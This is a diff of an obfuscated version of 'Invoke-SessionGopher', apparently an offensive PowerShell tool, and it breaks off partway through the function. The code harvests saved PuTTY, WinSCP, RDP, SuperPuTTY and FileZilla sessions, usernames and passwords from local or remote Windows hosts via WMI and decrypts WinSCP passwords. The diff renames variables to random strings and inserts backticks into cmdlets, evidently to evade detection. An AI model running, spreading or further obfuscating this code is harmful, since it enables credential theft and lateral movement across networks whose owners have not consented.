@@ -1,12 +1,12 @@
 function Invoke-SessionGopher {
   param (
-      [switch]$BedChunky, # Microsoft".
-      [switch]$FoldBlack, # Microsoft".
-      [string]$DanceFlash, # Microsoft".
-      [string]$MarbleFrail, # Microsoft".
-      [string]$TreePlace, # Microsoft".
-      [string]$SheetRecord, # Microsoft".
-      [switch]$GustyTricky # Microsoft".
+      [switch]$nFdMHRmJUTihVghjwpEMqoB, # Microsoft".
+      [switch]$NuFyNRnVcuXYDNHfsgjXUaLp, # Microsoft".
+      [string]$pxpEnoyFXZoXUXWepVVjNpnKVBNhm, # Microsoft".
+      [string]$HZVqrHhIDXUmKLuSFrRAJqOWmaAVLb, # Microsoft".
+      [string]$NmhwDRUaDzPVRZKQJZXKDb, # Microsoft".
+      [string]$QonQnbkKcDuNAMTMVVazYCoHlkLaWNiDyaFEuGNnthHnI, # Microsoft".
+      [switch]$XYvWFZWJvlMAzGYaPPRjX # Microsoft".
   )
 
   Write-Output '
@@ -18,207 +18,207 @@ function Invoke-SessionGopher {
      `m..m       Twitter: @arvanaghi | arvanaghi.com
   '
 
-  if ($BedChunky) {
-    $AdviseRacial = "SessionGopher (" + (Get-Date -Format "HH.mm.ss") + ")"
-    New-Item -ItemType Directory $AdviseRacial | Out-Null
-    New-Item ($AdviseRacial + "\PuTTY.csv") -Type File | Out-Null
-    New-Item ($AdviseRacial + "\SuperPuTTY.csv") -Type File | Out-Null
-    New-Item ($AdviseRacial + "\WinSCP.csv") -Type File | Out-Null
-    New-Item ($AdviseRacial + "\FileZilla.csv") -Type File | Out-Null
-    New-Item ($AdviseRacial + "\RDP.csv") -Type File | Out-Null
-    if ($FoldBlack) {
-        New-Item ($AdviseRacial + "\PuTTY ppk Files.csv") -Type File | Out-Null
-        New-Item ($AdviseRacial + "\Microsoft rdp Files.csv") -Type File | Out-Null
-        New-Item ($AdviseRacial + "\RSA sdtid Files.csv") -Type File | Out-Null
+  if ($nFdMHRmJUTihVghjwpEMqoB) {
+    $GAwlvlpwYPsIYDQPRdOJ = "SessionGopher (" + (Get-Date -Format "HH.mm.ss") + ")"
+    New-Item -ItemType Directory $GAwlvlpwYPsIYDQPRdOJ | Out-Null
+    New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\PuTTY.csv") -Type File | Out-Null
+    New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\SuperPuTTY.csv") -Type File | Out-Null
+    New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\WinSCP.csv") -Type File | Out-Null
+    New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\FileZilla.csv") -Type File | Out-Null
+    New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\RDP.csv") -Type File | Out-Null
+    if ($NuFyNRnVcuXYDNHfsgjXUaLp) {
+        New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\PuTTY ppk Files.csv") -Type File | Out-Null
+        New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\Microsoft rdp Files.csv") -Type File | Out-Null
+        New-Item ($GAwlvlpwYPsIYDQPRdOJ + "\RSA sdtid Files.csv") -Type File | Out-Null
     }
   }
 
-  if ($DanceFlash -and $MarbleFrail) {
-    $PastShake = ConvertTo-SecureString $MarbleFrail -AsPlainText -Force
-    $Credentials = new`-ob`je`ct -Typename System.Management.Automation.PSCredential -ArgumentList $DanceFlash, $PastShake
+  if ($pxpEnoyFXZoXUXWepVVjNpnKVBNhm -and $HZVqrHhIDXUmKLuSFrRAJqOWmaAVLb) {
+    $XssJWKNYEUORVeOpxpTFwFu = ConvertTo-SecureString $HZVqrHhIDXUmKLuSFrRAJqOWmaAVLb -AsPlainText -Force
+    $Credentials = ne`w`-`ob`je`ct -Typename System.Management.Automation.PSCredential -ArgumentList $pxpEnoyFXZoXUXWepVVjNpnKVBNhm, $XssJWKNYEUORVeOpxpTFwFu
   }
 
   # Microsoft".
-  $BrawnyTie = 2147483651
+  $OjHeEeSRTjqYbdSIyTxBehBNEspRF = 2147483651
   # Microsoft".
-  $NightPumped = 2147483650
+  $QMcEPEqyaloTlYTzaWKVWImIMOQVOHUnpyih = 2147483650
 
-  $NineReign = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
-  $AirFork = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
-  $BucketClam = "\SOFTWARE\Microsoft\Terminal Server Client\Servers"
+  $aVjehgNTFEbvQsuPTMIoDonHJjPRXQi = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
+  $JqUcuPbazeouvSZUdWmLHRsvwnOaf = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
+  $BkGbmSVYcilnyPYKLRRDDRoYXtZmV = "\SOFTWARE\Microsoft\Terminal Server Client\Servers"
 
-  if ($TreePlace -or $GustyTricky -or $SheetRecord) {
+  if ($NmhwDRUaDzPVRZKQJZXKDb -or $XYvWFZWJvlMAzGYaPPRjX -or $QonQnbkKcDuNAMTMVVazYCoHlkLaWNiDyaFEuGNnthHnI) {
 
     # Microsoft".
     $Reader = ""
 
-    if ($GustyTricky) {
+    if ($XYvWFZWJvlMAzGYaPPRjX) {
       $Reader = GetComputersFromActiveDirectory
-    } elseif ($TreePlace) { 
-      $Reader = Get-Content ((Resolve-Path $TreePlace).Path)
-    } elseif ($SheetRecord) {
-      $Reader = $SheetRecord
+    } elseif ($NmhwDRUaDzPVRZKQJZXKDb) { 
+      $Reader = Get-Content ((Resolve-Path $NmhwDRUaDzPVRZKQJZXKDb).Path)
+    } elseif ($QonQnbkKcDuNAMTMVVazYCoHlkLaWNiDyaFEuGNnthHnI) {
+      $Reader = $QonQnbkKcDuNAMTMVVazYCoHlkLaWNiDyaFEuGNnthHnI
     }
 
-    $ManyTrace = @{}
+    $RRhIihzIVOZRZmDMpJSdhcGovLlmbNimCixfNnYAWY = @{}
     if ($Credentials) {
-      $ManyTrace['Credential'] = $Credentials
+      $RRhIihzIVOZRZmDMpJSdhcGovLlmbNimCixfNnYAWY['Credential'] = $Credentials
     }
 
-    foreach ($AbackDesert in $Reader) {
+    foreach ($yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF in $Reader) {
 
-      if ($GustyTricky) {
+      if ($XYvWFZWJvlMAzGYaPPRjX) {
         # Microsoft".
-        $AbackDesert = $AbackDesert.Properties.name
-        if (!$AbackDesert) { Continue }
+        $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF = $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF.Properties.name
+        if (!$yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF) { Continue }
       }
 
       Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
-      Write-Host "Digging on" $AbackDesert"..."
+      Write-Host "Digging on" $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF"..."
 
-      $ViewNorth = Invoke-WmiMethod -Class 'StdRegProv' -Name 'EnumKey' -ArgumentList $BrawnyTie,'' -ComputerName $AbackDesert @optionalCreds | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}
+      $PSRKgrhnRAXuFDtTuJrourhOKD = Invoke-WmiMethod -Class 'StdRegProv' -Name 'EnumKey' -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,'' -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF @optionalCreds | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}
 
-      foreach ($AmuckPlacid in $ViewNorth) {
-
-        # Microsoft".
-        $CircleDog = try { (Split-Path -Leaf (Split-Path -Leaf (GetMappedSID))) } catch {}
-        $EndClassy = (($AbackDesert + "\" + $CircleDog) -Join "")
+      foreach ($qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB in $PSRKgrhnRAXuFDtTuJrourhOKD) {
 
         # Microsoft".
-        $BabiesCaring = new`-ob`je`ct PSObject
-
-        $GradeOwn = new`-ob`je`ct System.Collections.ArrayList
-        $NuttyAunt = new`-ob`je`ct System.Collections.ArrayList
-        $ScarfDisarm = new`-ob`je`ct System.Collections.ArrayList
-        $JadedCent = new`-ob`je`ct System.Collections.ArrayList
-        $SparkDry = new`-ob`je`ct System.Collections.ArrayList
+        $pKFZCQrLzGNzdmUNdhBdvCunsIPOo = try { (Split-Path -Leaf (Split-Path -Leaf (GetMappedSID))) } catch {}
+        $BMsqhbcZYwkwfMupnghp = (($yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF + "\" + $pKFZCQrLzGNzdmUNdhBdvCunsIPOo) -Join "")
 
         # Microsoft".
-        $FlimsyTease = $AmuckPlacid + $BucketClam
-        $FineKnown = $AmuckPlacid + $NineReign
-        $HardDream = $AmuckPlacid + $AirFork
-        $TreatGreasy = "Drive='C:' AND Path='\\Users\\$CircleDog\\Documents\\SuperPuTTY\\' AND FileName='Sessions' AND Extension='XML'"
-        $FileZillaFilter = "Drive='C:' AND Path='\\Users\\$CircleDog\\AppData\\Roaming\\FileZilla\\' AND FileName='sitemanager' AND Extension='XML'"
+        $tHugALOaXKmLXhgXdEjXRUOG = ne`w`-`ob`je`ct PSObject
 
-        $PasteBasin = Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name EnumKey -ArgumentList $BrawnyTie,$FlimsyTease @optionalCreds
-        $StormyRare = Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name EnumKey -ArgumentList $BrawnyTie,$FineKnown @optionalCreds
-        $ScorchLearn = Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name EnumKey -ArgumentList $BrawnyTie,$HardDream @optionalCreds
-        $SideKeen = (Get-WmiObject -Class 'CIM_DataFile' -Filter $TreatGreasy -ComputerName $AbackDesert @optionalCreds | Select Name)
-        $FileZillaPath = (Get-WmiObject -Class 'CIM_DataFile' -Filter $FileZillaFilter -ComputerName $AbackDesert @optionalCreds | Select Name)
+        $novtuvVGrxDTTVCRNsEwoC = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $bVQdQAAqTINLSHvHqjXEZwziqugApeKaNLAuGJkXTzUWY = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $cTWMuhzRBpgLjOdAEBuayABpY = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF = ne`w`-`ob`je`ct System.Collections.ArrayList
 
         # Microsoft".
-        if (($ScorchLearn | Select-Object -ExpandPropert ReturnValue) -eq 0) {
+        $yAtdnHIVTQbGhgZPtmBnyLPLgyyVZeFodSEfi = $qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB + $BkGbmSVYcilnyPYKLRRDDRoYXtZmV
+        $qdBvqVgNPRZmYEkDsaYxARhySNggzttDFBrTXuwL = $qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB + $aVjehgNTFEbvQsuPTMIoDonHJjPRXQi
+        $zDWsbFANxXhtGEFHMWpqStvM = $qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB + $JqUcuPbazeouvSZUdWmLHRsvwnOaf
+        $drddzvJSSGtjmeeYgTnaWFWYmQBLepyfLOMxyki = "Drive='C:' AND Path='\\Users\\$pKFZCQrLzGNzdmUNdhBdvCunsIPOo\\Documents\\SuperPuTTY\\' AND FileName='Sessions' AND Extension='XML'"
+        $FileZillaFilter = "Drive='C:' AND Path='\\Users\\$pKFZCQrLzGNzdmUNdhBdvCunsIPOo\\AppData\\Roaming\\FileZilla\\' AND FileName='sitemanager' AND Extension='XML'"
+
+        $GeidNmDrhZwDYCUvJqNKqrRPvX = Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name EnumKey -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$yAtdnHIVTQbGhgZPtmBnyLPLgyyVZeFodSEfi @optionalCreds
+        $qkvhNkYJRQAmMxSIAMZqZTRkiPQVpOzYwfmYR = Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name EnumKey -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$qdBvqVgNPRZmYEkDsaYxARhySNggzttDFBrTXuwL @optionalCreds
+        $csOaknHDomNorAeXbcHTasAnnRO = Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name EnumKey -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$zDWsbFANxXhtGEFHMWpqStvM @optionalCreds
+        $eKfJsKaAHeFmEzEghZmLBqOufAuzACssNYaXKsOTYhhL = (Get-WmiObject -Class 'CIM_DataFile' -Filter $drddzvJSSGtjmeeYgTnaWFWYmQBLepyfLOMxyki -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF @optionalCreds | Select Name)
+        $FileZillaPath = (Get-WmiObject -Class 'CIM_DataFile' -Filter $FileZillaFilter -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF @optionalCreds | Select Name)
+
+        # Microsoft".
+        if (($csOaknHDomNorAeXbcHTasAnnRO | Select-Object -ExpandPropert ReturnValue) -eq 0) {
 
           # Microsoft".
-          $ScorchLearn = $ScorchLearn | Select-Object -ExpandProperty sNames
+          $csOaknHDomNorAeXbcHTasAnnRO = $csOaknHDomNorAeXbcHTasAnnRO | Select-Object -ExpandProperty sNames
           
-          foreach ($LameTrip in $ScorchLearn) {
+          foreach ($WUcWkqSWPctdJFnoAMstETqzJakrnSqzmafeVbFazUCol in $csOaknHDomNorAeXbcHTasAnnRO) {
       
-            $StreetClammy = "" | Select-Object -Property Source,Session,Hostname,Username,Password
-            $StreetClammy.Source = $EndClassy
-            $StreetClammy.Session = $LameTrip
+            $XLgMsnHgjGNxngdhjsJDumISm = "" | Select-Object -Property Source,Session,Hostname,Username,Password
+            $XLgMsnHgjGNxngdhjsJDumISm.Source = $BMsqhbcZYwkwfMupnghp
+            $XLgMsnHgjGNxngdhjsJDumISm.Session = $WUcWkqSWPctdJFnoAMstETqzJakrnSqzmafeVbFazUCol
 
-            $UnitSkip = $HardDream + "\" + $LameTrip
+            $bVjdnqzzzhBVfbivcJWIU = $zDWsbFANxXhtGEFHMWpqStvM + "\" + $WUcWkqSWPctdJFnoAMstETqzJakrnSqzmafeVbFazUCol
 
-            $StreetClammy.Hostname = (Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name GetStringValue -ArgumentList $BrawnyTie,$UnitSkip,"HostName" @optionalCreds).sValue
-            $StreetClammy.Username = (Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name GetStringValue -ArgumentList $BrawnyTie,$UnitSkip,"UserName" @optionalCreds).sValue
-            $StreetClammy.Password = (Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name GetStringValue -ArgumentList $BrawnyTie,$UnitSkip,"Password" @optionalCreds).sValue
+            $XLgMsnHgjGNxngdhjsJDumISm.Hostname = (Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name GetStringValue -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$bVjdnqzzzhBVfbivcJWIU,"HostName" @optionalCreds).sValue
+            $XLgMsnHgjGNxngdhjsJDumISm.Username = (Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name GetStringValue -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$bVjdnqzzzhBVfbivcJWIU,"UserName" @optionalCreds).sValue
+            $XLgMsnHgjGNxngdhjsJDumISm.Password = (Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name GetStringValue -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$bVjdnqzzzhBVfbivcJWIU,"Password" @optionalCreds).sValue
 
-            if ($StreetClammy.Password) {
+            if ($XLgMsnHgjGNxngdhjsJDumISm.Password) {
 
-              $GodlyMale = $AmuckPlacid + "\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
+              $EaqfJqtJlleUvpOdxvSDPOMgDjIaTKOTMcSTBUD = $qHdJtBeluOOwrzppLFhGqwcYNogDLhVOwxVABB + "\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
           
-              $DollStain = (Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $BrawnyTie,$GodlyMale,"UseMasterPassword" @optionalCreds).uValue
+              $DzkJihLBUKqMjcDFcYdQZojZfg = (Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$EaqfJqtJlleUvpOdxvSDPOMgDjIaTKOTMcSTBUD,"UseMasterPassword" @optionalCreds).uValue
               
-              if (!$DollStain) {
-                  $StreetClammy.Password = (DecryptWinSCPPassword $StreetClammy.Hostname $StreetClammy.Username $StreetClammy.Password)
+              if (!$DzkJihLBUKqMjcDFcYdQZojZfg) {
+                  $XLgMsnHgjGNxngdhjsJDumISm.Password = (DecryptWinSCPPassword $XLgMsnHgjGNxngdhjsJDumISm.Hostname $XLgMsnHgjGNxngdhjsJDumISm.Username $XLgMsnHgjGNxngdhjsJDumISm.Password)
               } else {
-                  $StreetClammy.Password = "Saved in session, but master password prevents plaintext recovery"
+                  $XLgMsnHgjGNxngdhjsJDumISm.Password = "Saved in session, but master password prevents plaintext recovery"
               }
 
             }
              
-            [void]$SparkDry.Add($StreetClammy)
+            [void]$NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF.Add($XLgMsnHgjGNxngdhjsJDumISm)
       
           } # Microsoft".
 
-          if ($SparkDry.count -gt 0) {
+          if ($NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF.count -gt 0) {
 
-            $BabiesCaring | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -CanvasStingy $SparkDry
+            $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF
 
-            if ($BedChunky) {
-              $SparkDry | Select-Object * | Export-CSV -Append -Path ($AdviseRacial + "\WinSCP.csv") -NoTypeInformation
+            if ($nFdMHRmJUTihVghjwpEMqoB) {
+              $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF | Select-Object * | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\WinSCP.csv") -NoTypeInformation
             } else {
               Write-Output "WinSCP Sessions"
-              $SparkDry | Select-Object * | Format-List | Out-String
+              $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF | Select-Object * | Format-List | Out-String
             }
 
           }
         
         } # Microsoft".
 
-        if (($StormyRare | Select-Object -ExpandPropert ReturnValue) -eq 0) {
+        if (($qkvhNkYJRQAmMxSIAMZqZTRkiPQVpOzYwfmYR | Select-Object -ExpandPropert ReturnValue) -eq 0) {
 
           # Microsoft".
-          $StormyRare = $StormyRare | Select-Object -ExpandProperty sNames
+          $qkvhNkYJRQAmMxSIAMZqZTRkiPQVpOzYwfmYR = $qkvhNkYJRQAmMxSIAMZqZTRkiPQVpOzYwfmYR | Select-Object -ExpandProperty sNames
 
-          foreach ($TreatSilky in $StormyRare) {
+          foreach ($AoOfbGWPONhTYplGxHpqXrZE in $qkvhNkYJRQAmMxSIAMZqZTRkiPQVpOzYwfmYR) {
       
-            $TicketSilk = "" | Select-Object -Property Source,Session,Hostname
+            $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT = "" | Select-Object -Property Source,Session,Hostname
 
-            $UnitSkip = $FineKnown + "\" + $TreatSilky
+            $bVjdnqzzzhBVfbivcJWIU = $qdBvqVgNPRZmYEkDsaYxARhySNggzttDFBrTXuwL + "\" + $AoOfbGWPONhTYplGxHpqXrZE
 
-            $TicketSilk.Source = $EndClassy
-            $TicketSilk.Session = $TreatSilky
-            $TicketSilk.Hostname = (Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name GetStringValue -ArgumentList $BrawnyTie,$UnitSkip,"HostName" @optionalCreds).sValue
+            $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT.Source = $BMsqhbcZYwkwfMupnghp
+            $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT.Session = $AoOfbGWPONhTYplGxHpqXrZE
+            $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT.Hostname = (Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name GetStringValue -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$bVjdnqzzzhBVfbivcJWIU,"HostName" @optionalCreds).sValue
              
-            [void]$GradeOwn.Add($TicketSilk)
+            [void]$novtuvVGrxDTTVCRNsEwoC.Add($WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT)
       
           }
 
-          if ($GradeOwn.count -gt 0) {
+          if ($novtuvVGrxDTTVCRNsEwoC.count -gt 0) {
 
-            $BabiesCaring | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -CanvasStingy $GradeOwn
+            $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $novtuvVGrxDTTVCRNsEwoC
 
-            if ($BedChunky) {
-              $GradeOwn | Select-Object * | Export-CSV -Append -Path ($AdviseRacial + "\PuTTY.csv") -NoTypeInformation
+            if ($nFdMHRmJUTihVghjwpEMqoB) {
+              $novtuvVGrxDTTVCRNsEwoC | Select-Object * | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\PuTTY.csv") -NoTypeInformation
             } else {
               Write-Output "PuTTY Sessions"
-              $GradeOwn | Select-Object * | Format-List | Out-String
+              $novtuvVGrxDTTVCRNsEwoC | Select-Object * | Format-List | Out-String
             }
 
           }
 
         } # Microsoft".
 
-        if (($PasteBasin | Select-Object -ExpandPropert ReturnValue) -eq 0) {
+        if (($GeidNmDrhZwDYCUvJqNKqrRPvX | Select-Object -ExpandPropert ReturnValue) -eq 0) {
 
           # Microsoft".
-          $PasteBasin = $PasteBasin | Select-Object -ExpandProperty sNames
+          $GeidNmDrhZwDYCUvJqNKqrRPvX = $GeidNmDrhZwDYCUvJqNKqrRPvX | Select-Object -ExpandProperty sNames
 
-          foreach ($SeedMagic in $PasteBasin) {
+          foreach ($axYwJpXfqEgjsBlTzHdOTvudAGUFoE in $GeidNmDrhZwDYCUvJqNKqrRPvX) {
       
-            $MinutePray = "" | Select-Object -Property Source,Hostname,Username
+            $amqBKYntDmEFiuSMDRfymmDTQFTDB = "" | Select-Object -Property Source,Hostname,Username
             
-            $UnitSkip = $FlimsyTease + "\" + $SeedMagic
+            $bVjdnqzzzhBVfbivcJWIU = $yAtdnHIVTQbGhgZPtmBnyLPLgyyVZeFodSEfi + "\" + $axYwJpXfqEgjsBlTzHdOTvudAGUFoE
 
-            $MinutePray.Source = $EndClassy
-            $MinutePray.Hostname = $SeedMagic
-            $MinutePray.Username = (Invoke-WmiMethod -ComputerName $AbackDesert -Class 'StdRegProv' -Name GetStringValue -ArgumentList $BrawnyTie,$UnitSkip,"UserNameHint" @optionalCreds).sValue
+            $amqBKYntDmEFiuSMDRfymmDTQFTDB.Source = $BMsqhbcZYwkwfMupnghp
+            $amqBKYntDmEFiuSMDRfymmDTQFTDB.Hostname = $axYwJpXfqEgjsBlTzHdOTvudAGUFoE
+            $amqBKYntDmEFiuSMDRfymmDTQFTDB.Username = (Invoke-WmiMethod -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF -Class 'StdRegProv' -Name GetStringValue -ArgumentList $OjHeEeSRTjqYbdSIyTxBehBNEspRF,$bVjdnqzzzhBVfbivcJWIU,"UserNameHint" @optionalCreds).sValue
 
-            [void]$ScarfDisarm.Add($MinutePray)
+            [void]$BtUaCCvgPWNHcXFnMqfwlhRaRHPBu.Add($amqBKYntDmEFiuSMDRfymmDTQFTDB)
       
           }
 
-          if ($ScarfDisarm.count -gt 0) {
+          if ($BtUaCCvgPWNHcXFnMqfwlhRaRHPBu.count -gt 0) {
 
-            $BabiesCaring | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -CanvasStingy $ScarfDisarm
+            $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu
 
-            if ($BedChunky) {
-              $ScarfDisarm | Select-Object * | Export-CSV -Append -Path ($AdviseRacial + "\RDP.csv") -NoTypeInformation
+            if ($nFdMHRmJUTihVghjwpEMqoB) {
+              $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu | Select-Object * | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\RDP.csv") -NoTypeInformation
             } else {
               Write-Output "Microsoft RDP Sessions"
-              $ScarfDisarm | Select-Object * | Format-List | Out-String
+              $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu | Select-Object * | Format-List | Out-String
             }
 
           }
@@ -226,20 +226,20 @@ function Invoke-SessionGopher {
         } # Microsoft".
 
         # Microsoft".
-        if ($SideKeen.Name) {
+        if ($eKfJsKaAHeFmEzEghZmLBqOufAuzACssNYaXKsOTYhhL.Name) {
 
-          $File = "C:\Users\$CircleDog\Documents\SuperPuTTY\Sessions.xml"
+          $File = "C:\Users\$pKFZCQrLzGNzdmUNdhBdvCunsIPOo\Documents\SuperPuTTY\Sessions.xml"
           $FileContents = DownloadAndExtractFromRemoteRegistry $File
 
-          [xml]$ReturnMarket = $FileContents
-          (ProcessSuperPuTTYFile $ReturnMarket)
+          [xml]$xSUZWiIFWzdJkYAJQeScDzPWnccWPMi = $FileContents
+          (ProcessSuperPuTTYFile $xSUZWiIFWzdJkYAJQeScDzPWnccWPMi)
 
         }
 
         # Microsoft".
         if ($FileZillaPath.Name) {
 
-          $File = "C:\Users\$CircleDog\AppData\Roaming\FileZilla\sitemanager.xml"
+          $File = "C:\Users\$pKFZCQrLzGNzdmUNdhBdvCunsIPOo\AppData\Roaming\FileZilla\sitemanager.xml"
           $FileContents = DownloadAndExtractFromRemoteRegistry $File
 
           [xml]$FileZillaXML = $FileContents
@@ -249,13 +249,13 @@ function Invoke-SessionGopher {
 
       } # Microsoft".
 
-      if ($FoldBlack) {
+      if ($NuFyNRnVcuXYDNHfsgjXUaLp) {
 
-        $DreamExpect = new`-ob`je`ct System.Collections.ArrayList
-        $JumpySmash = new`-ob`je`ct System.Collections.ArrayList
-        $ShopSnow = new`-ob`je`ct System.Collections.ArrayList
+        $vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $ALyYGPldjWMXbilDGXXuwzTiScIOh = ne`w`-`ob`je`ct System.Collections.ArrayList
+        $ROkBCNKdDchnbbrBbYFwJJ = ne`w`-`ob`je`ct System.Collections.ArrayList
 
-        $FilePathsFound = (Get-WmiObject -Class 'CIM_DataFile' -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'" -ComputerName $AbackDesert @optionalCreds | Select Name)
+        $FilePathsFound = (Get-WmiObject -Class 'CIM_DataFile' -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'" -ComputerName $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF @optionalCreds | Select Name)
 
         (ProcessThoroughRemote $FilePathsFound)
         
@@ -270,33 +270,33 @@ function Invoke-SessionGopher {
     Write-Host "Digging on"(Hostname)"..."
 
     # Microsoft".
-    $KneelFlight = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}
+    $BfdHjfazBjBOrBSdxELjwNBSSOXWH = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}
 
     # Microsoft".
-    foreach($TanCurve in $KneelFlight) {
+    foreach($txgGeZgPwCbJEodqAEpGXCWnFc in $BfdHjfazBjBOrBSdxELjwNBSSOXWH) {
 
       # Microsoft".
-      $BabiesCaring = new`-ob`je`ct PSObject
+      $tHugALOaXKmLXhgXdEjXRUOG = ne`w`-`ob`je`ct PSObject
 
-      $SparkDry = new`-ob`je`ct System.Collections.ArrayList
-      $GradeOwn = new`-ob`je`ct System.Collections.ArrayList
-      $DreamExpect = new`-ob`je`ct System.Collections.ArrayList
-      $NuttyAunt = new`-ob`je`ct System.Collections.ArrayList
-      $ScarfDisarm = new`-ob`je`ct System.Collections.ArrayList
-      $JumpySmash = new`-ob`je`ct System.Collections.ArrayList
-      $JadedCent = new`-ob`je`ct System.Collections.ArrayList
+      $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF = ne`w`-`ob`je`ct System.Collections.ArrayList
